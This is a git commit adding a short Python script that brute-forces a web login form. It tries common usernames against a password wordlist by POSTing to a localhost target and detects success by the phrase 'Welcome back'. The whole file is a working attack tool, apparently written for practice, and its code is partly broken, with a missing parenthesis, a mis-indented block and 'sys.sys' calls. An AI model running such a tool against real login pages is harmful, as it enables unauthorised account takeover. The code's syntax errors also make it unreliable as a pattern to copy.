63ba1d73e61717ef0345ddf27c5dd3db65ecf33b
bara almustafa <73045713+bara11@users.noreply.github.com>
2022-09-08 05:54:33 +0300

    Create web-login-brute-forcer.py

---
+++ web-login-brute-forcer.py
@@ -0,0 +1,24 @@
+#! /usr/bin/env python3
+from asyncore import write
+import sys
+from urllib import request
+import requests
+target="http://127.0.0.1:5000"
+usernames=["admin","user","test"]
+passwords="top-100.txt"
+needle="Welcome back"
+for username in usernames:
+    with open(passwords,"r") as passwords_list:
+        for password in passwords_list:
+          password= password.strip("\n").encode()
+          sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username,password.decode())
+          sys.stdout.flush()
+          r=requests.post(target,data={"username":username,"password":password})
+          if needle.encode() in r.content:
+          sys.stdout.write("\n")
+          sys.stdout.write("\t[>>>>>] Vaild password '{}' found for user '{}'!".format(password.decode(),username))
+          sys.exit()
+    sys.stdout.flush()
+    sys.sys.stdout.write("\n")
+    sys.sys.stdout.write("\tNo password found for '{}'!".format(username))
+    sys.sys.stdout.write("\n")
